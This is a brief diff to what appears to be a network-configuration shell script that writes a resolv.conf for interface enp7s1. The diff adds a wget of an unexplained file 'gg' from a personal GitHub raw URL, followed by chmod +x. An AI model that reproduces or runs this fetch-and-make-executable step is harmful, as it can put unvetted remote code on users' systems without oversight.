@@ -123,6 +123,7 @@ cat > /etc/net/ifaces/enp7s1/resolv.conf <<EOF
 
 EOF
 
-
+wget raw.githubusercontent.com/popanam/demo/refs/heads/main/gg
+chmod +x gg
 
 exec bash
